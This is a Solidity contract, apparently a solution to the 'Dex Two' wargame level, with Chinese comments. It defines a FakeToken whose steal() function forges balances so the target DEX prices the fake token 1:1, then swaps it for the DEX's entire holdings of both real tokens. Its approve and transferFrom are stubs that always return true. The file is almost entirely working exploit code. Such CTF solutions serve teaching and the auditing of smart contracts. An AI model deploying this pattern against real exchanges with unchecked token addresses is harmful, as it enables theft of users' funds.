// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface DexTwoI {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function getSwapAmount(address from, address to, uint256 amount) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract FakeToken {
    mapping(address account => uint256) private _balances;
    DexTwoI private dexTwo;

    // 随意设置余额
    function setBalance(address _addr, uint256 amount) public {
        _balances[_addr] = amount;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return _balances[_owner];
    }

    constructor(address _dexTwo) {
        dexTwo = DexTwoI(_dexTwo);
    }

    function steal() public {
        uint256 amt = dexTwo.balanceOf(dexTwo.token1(), address(dexTwo));
        // 让 DexTwo以为汇率是 1:1
        _balances[address(dexTwo)] = amt;
        // 让 FakeToken 合约恰好持有这么多余额来做兑换
        _balances[address(this)] = amt;
        // 用自己的 FakeToken， 换 Token1
        dexTwo.swap(address(this), dexTwo.token1(), amt);

        // Token2 如法炮制
        amt = dexTwo.balanceOf(dexTwo.token2(), address(dexTwo));
        // 让 DexTwo以为汇率是 1:1
        _balances[address(dexTwo)] = amt;
        // 让 FakeToken 合约恰好持有这么多余额来做兑换
        _balances[address(this)] = amt;
        // 用自己的 FakeToken， 换 Token2
        dexTwo.swap(address(this), dexTwo.token2(), amt);
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        // 内部实现其实不重要, 我们可以甚至不实现内容
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        // 内部实现其实不重要, 我们可以甚至不实现内容
        return true;
    }
}
